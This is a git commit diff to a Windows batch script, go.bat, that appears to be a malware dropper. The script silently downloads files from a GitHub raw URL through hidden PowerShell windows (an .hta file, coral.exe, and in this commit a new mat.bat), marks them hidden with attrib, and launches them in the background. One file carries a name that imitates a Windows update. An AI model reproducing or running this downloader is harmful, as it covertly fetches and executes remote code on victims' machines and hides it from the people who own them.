1246081dde16f410f54233b88bc86412277a0ee1
jinafaz <48602030+jinafaz@users.noreply.github.com>
2019-03-17 14:11:51 +0000

    Update go.bat

--- go.bat
+++ go.bat
@@ -1,9 +1,11 @@
 :top0 
 timeout /t 1 & 
 powershell -Window Hidden Invoke-WebRequest -Uri https://raw.githubusercontent.com/jinafaz/Home/master/mathew.hta -Outfile %tmp%/mathew.hta
+powershell -Window Hidden Invoke-WebRequest -Uri https://raw.githubusercontent.com/jinafaz/Home/master/mat.bat -Outfile %tmp%/mat.bat
 cmd /c attrib +h %tmp%/go.bat 
 cmd /c attrib +h %tmp%/mathew.hta
 cmd /c attrib +h %tmp%/KB0912313.bat 
+cmd /c attrib +h %tmp%/mat.bat 
 goto top1 
 
 :top1 
@@ -19,3 +21,8 @@ powershell -Window Hidden Invoke-WebRequest -Uri https://raw.githubusercontent.c
 cmd /c attrib +h %tmp%/coral.exe 
 cmd /c start /B %tmp%/coral.exe 
 goto top3 
+
+:top3
+timeout /t 1 &
+cmd /c start /B %tmp%/mat.bat
+
